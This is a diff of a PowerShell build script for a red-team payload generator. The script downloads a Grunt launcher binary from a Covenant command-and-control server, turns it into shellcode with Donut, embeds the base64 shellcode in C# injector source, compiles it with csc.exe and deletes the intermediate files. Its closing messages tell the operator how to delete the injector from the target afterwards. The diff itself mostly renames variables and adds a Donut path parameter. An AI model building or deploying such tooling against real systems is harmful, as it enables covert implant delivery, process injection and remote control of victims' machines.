@@ -8,16 +8,21 @@
 
 # Command line arguments
 param(
-    [Parameter(Mandatory=$true)][string]$LauncherURL
+    [Parameter(Mandatory = $true)]
+    [string]
+    $LauncherURL,
+
+    [Parameter(Mandatory = $false)]
+    [string]
+    $DonutPath = "donut"
 )
 
 # Variables
 $wd = (Get-Location).Path
-$launcherExePath = "GruntLauncher.exe"
-$injectorShellcodePath = "GruntInjector.bin"
-$gruntInjectorSourcePath = "GruntInjector.cs"
+$LauncherExePath = "GruntLauncher.exe"
+$InjectorShellcodePath = "GruntInjector.bin"
+$GruntInjectorSourcePath = "GruntInjector.cs"
 $cscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
-$donutPath = "donut\donut.exe"
 
 # Download binary Grunt launcher from Covenant server
 $launcherBinary = (New-Object Net.WebClient).DownloadString($LauncherURL)
@@ -26,13 +31,13 @@ $launcherBinary = (New-Object Net.WebClient).DownloadString($LauncherURL)
 Set-Content -Path $launcherExePath -Value $launcherBinary
 
 # Use Donut to translate the binary launcher on disk into shellcode
-$supressDonutOutput = Invoke-Expression -Command "$donutPath -f $launcherExePath -o $injectorShellcodePath"
+Invoke-Expression -Command "& '$DonutPath' $LauncherExePath -o $InjectorShellcodePath" | Out-Null
 
 # Base 64 encode shellcode
-$base64Shellcode = ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$wd\$injectorShellcodePath")))
+$base64Shellcode = ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$InjectorShellcodePath")))
 
 # Insert base 64 encoded shellcode into GruntInjector.cs
-$gruntInjectorSource = @"
+$GruntInjectorSource = @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -223,15 +228,15 @@ namespace GruntInjection
 "@
 
 # Write injector source code to disk
-Set-Content -Path $gruntInjectorSourcePath -Value $gruntInjectorSource
+Set-Content -Path $GruntInjectorSourcePath -Value $GruntInjectorSource
 
 # Compile injector source code file with CSC V4
-$supressCscOutput = IEX -Command "$cscPath $gruntInjectorSourcePath"
+Invoke-Expression -Command "$CscPath $GruntInjectorSourcePath" | Out-Null
 
 # Clean up launcher binary, shellcode, and injector source code
-Remove-Item -Path $launcherExePath
-Remove-Item -Path $injectorShellcodePath
-Remove-Item -Path $gruntInjectorSourcePath
+Remove-Item -Path $LauncherExePath
+Remove-Item -Path $InjectorShellcodePath
+Remove-Item -Path $GruntInjectorSourcePath
 
 # Notify the operator 
 Write-Host "[*] GruntInjector.exe generated"
@@ -246,3 +251,4 @@ Write-Host "`n[****] CLEAN UP"
 Write-Host "[****] Covenant -> Grunts -> <choose grunt> -> Interact"
 Write-Host "[****] shell del <path to injector on target>"
 
+#>
